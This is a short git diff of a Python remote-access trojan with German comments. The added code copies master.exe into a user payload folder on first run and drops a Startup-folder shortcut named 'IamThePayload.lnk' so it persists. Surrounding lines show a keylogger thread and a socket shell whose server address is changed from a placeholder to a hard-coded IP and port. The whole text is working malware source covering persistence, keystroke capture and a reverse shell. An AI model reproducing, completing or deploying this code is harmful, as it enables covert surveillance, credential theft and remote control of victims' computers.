@@ -7,10 +7,19 @@ import os
 import getpass
 import pyautogui
 from cv2 import *
+from swinlnk.swinlnk import SWinLnk
+from shutil import copyfile
 
-pfad_to_payload_files='C:\\Users\\'+getpass.getuser()+'\\payload_files'
-if not os.path.exists(pfad_to_payload_files):
+
+# Erster Start
+if not os.path.exists('C:\\Users\\'+getpass.getuser()+'\\payload'):
+    os.makedirs('C:\\Users\\'+getpass.getuser()+'\\payload')
+    pfad_to_payload_files='C:\\Users\\'+getpass.getuser()+'\\payload_files'
     os.makedirs(pfad_to_payload_files)
+    copyfile("master.exe","C:\\Users\\"+getpass.getuser()+"\\payload\\master.exe")
+    swl = SWinLnk()
+    swl.create_lnk('C:\\Users\\'+getpass.getuser()+'\\payload\\master.exe', 'C:\\Users\\Windows\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IamThePayload.lnk')
+
 
 
 # Keylogger
@@ -20,7 +29,7 @@ thread_keylogger.start()
 
 # Shell
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("THE SERVER IP MUST BE HERE",50000))                               # You IP and Port!
+s.connect(("192.168.178.29",50000))                               # You IP and Port!
 
 
 try:
